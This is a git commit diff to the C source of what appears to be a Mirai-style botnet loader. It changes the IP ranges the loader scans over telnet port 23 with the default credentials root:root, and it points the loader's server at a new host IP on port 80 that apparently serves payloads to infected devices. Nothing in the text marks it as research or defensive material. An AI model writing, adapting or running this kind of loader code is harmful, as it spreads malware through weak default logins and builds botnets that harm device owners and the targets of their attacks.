8cfd7230192499fec2f43711497fc45fd0fe0d28
hamza <hamza@hamzas-MacBook-Pro.local>
2026-08-20 12:07:51 +0100

    update

--- loader/src/main.c
+++ loader/src/main.c
@@ -56,7 +56,7 @@ void auto_scan_lab(void)
     for (int i = 1; i <= 254; i++)
     {
         char strbuf[128];
-        snprintf(strbuf, sizeof(strbuf), "56.228.34.%d:23 root:root", i);
+        snprintf(strbuf, sizeof(strbuf), "13.51.157.%d:23 root:root", i);
         
         memset(&info, 0, sizeof(struct telnet_info));
         if (telnet_info_parse(strbuf, &info) != NULL)
@@ -122,7 +122,7 @@ void auto_scan_random(void)
         uint8_t o3 = rand() % 256;
         uint8_t o4 = (rand() % 254) + 1;
         
-        snprintf(strbuf, sizeof(strbuf), "16.171.37.%d:23 root:root", o4);
+        snprintf(strbuf, sizeof(strbuf), "13.51.157.%d:23 root:root", o4);
         
         memset(&info, 0, sizeof(struct telnet_info));
         if (telnet_info_parse(strbuf, &info) != NULL)
@@ -150,7 +150,7 @@ int main(int argc, char **args)
 
     addrs_len = 1;
     addrs = calloc(addrs_len, sizeof(ipv4_t));
-    addrs[0] = inet_addr("172.16.237.8");
+    addrs[0] = htonl(INADDR_ANY);
 
     if (argc == 2)
         id_tag = args[1];
@@ -162,7 +162,7 @@ int main(int argc, char **args)
     }
 
     if ((srv = server_create(sysconf(_SC_NPROCESSORS_ONLN), addrs_len, addrs, 
-                              1024 * 64, "13.61.25.35", 80, "13.61.25.35")) == NULL)
+                              1024 * 64, "13.60.69.47", 80, "13.60.69.47")) == NULL)
     {
         printf("Failed to initialize server. Aborting\n");
         return 1;
